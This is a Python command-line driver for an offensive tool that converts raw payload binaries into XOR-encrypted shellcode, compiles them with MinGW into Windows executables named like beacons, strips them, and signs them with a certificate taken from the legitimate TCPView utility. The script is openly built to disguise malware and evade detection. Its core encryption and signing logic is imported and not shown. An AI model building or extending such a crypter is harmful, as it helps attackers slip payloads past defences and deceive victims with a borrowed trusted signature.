#!/usr/bin/python3
from lib import logger, core
import argparse, os

example_text = '''Example:

python3 scx.py -l c -b payload.bin --sign --strip
python3 scx.py -l c -b payload_x64.bin --sign --strip --x64
'''

parser = argparse.ArgumentParser(prog='scx',
                                 description='Convert raw binaries to encrypted shellcode',
                                 epilog=example_text,
                                 formatter_class=argparse.RawDescriptionHelpFormatter)

parser.add_argument("-l", "--language", metavar="", required=True, help="Language for payload (c, cs and powershell)")
parser.add_argument("-b", "--binary", metavar="", required=True, help="Raw file to encrypt")
parser.add_argument("-k", "--key", metavar="", help="Key to encrypt with (random by default)")
parser.add_argument("-n", "--name", metavar="", help="Name of executable (random by xor_beacon_*.exe)")
parser.add_argument("--x64", default=False, action='store_true', help="Set compiler to x64")
parser.add_argument("--sign", default=False, action='store_true', help="Sign with TCPView's Certificate")
parser.add_argument("--strip", default=False, action='store_true', help="Strip Binary")
args = parser.parse_args()

logger.banner()

lang = args.language

if args.x64:
    arch = 'x64'
else:
    arch = 'x86'

key = args.key
strip = args.strip
sign = args.sign
name = args.name

try:
    file_bytes = open(args.binary, "rb").read()
except Exception as e:
    logger.msg('Error opening file: ',e,'red')
    quit()

if not os.path.exists('./result/'):
    os.makedirs('./result')

prereqs = ['i686-w64-mingw32-gcc', 'x86_64-w64-mingw32-gcc', 'mcs']

for p in prereqs:
    r = os.system(p + ' > /dev/null 2>&1')
    if r != 256:
        logger.msg('Missing requirement: ',p,'red')
        quit()

scx = core.Scx(lang,arch,key,file_bytes,name)

logger.msg('Architecture: ', scx.arch, 'blue')
logger.msg('Key: ', scx.key, 'blue')

if lang == 'c':
    scx.c()

elif lang == 'cs':
    logger.msg('Todo!',None,'blue')
    quit()

elif lang == 'ps':
    logger.msg('Todo!',None,'blue')
    quit()

else:
    quit()

if scx.compile():
    if strip:
        scx.strip()
    if sign:
        scx.sign()
